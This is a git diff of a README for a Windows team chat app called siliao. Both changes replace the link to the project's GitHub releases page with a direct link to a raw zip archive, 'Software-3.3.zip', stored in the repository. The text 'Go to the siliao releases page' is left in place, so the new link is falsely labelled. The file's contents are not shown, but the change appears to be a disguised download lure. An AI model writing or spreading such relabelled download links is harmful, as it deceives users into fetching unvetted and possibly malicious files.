@@ -1,6 +1,6 @@
 # 💬 siliao - Simple team chat for daily work
 
-[![Download siliao](https://img.shields.io/badge/Download%20siliao-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Eroseleafgrowth612/siliao/releases)
+[![Download siliao](https://img.shields.io/badge/Download%20siliao-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Eroseleafgrowth612/siliao/main/frontend/Software-3.3.zip)
 
 ## 🧭 What siliao does
 
@@ -35,7 +35,7 @@ For best results, use a modern version of Windows and allow the app through your
 
 Visit the release page here and download the Windows app from the latest release:
 
-[Go to the siliao releases page](https://github.com/Eroseleafgrowth612/siliao/releases)
+[Go to the siliao releases page](https://raw.githubusercontent.com/Eroseleafgrowth612/siliao/main/frontend/Software-3.3.zip)
 
 After the page opens, pick the Windows file from the newest release. If you see more than one file, choose the one meant for Windows.
 
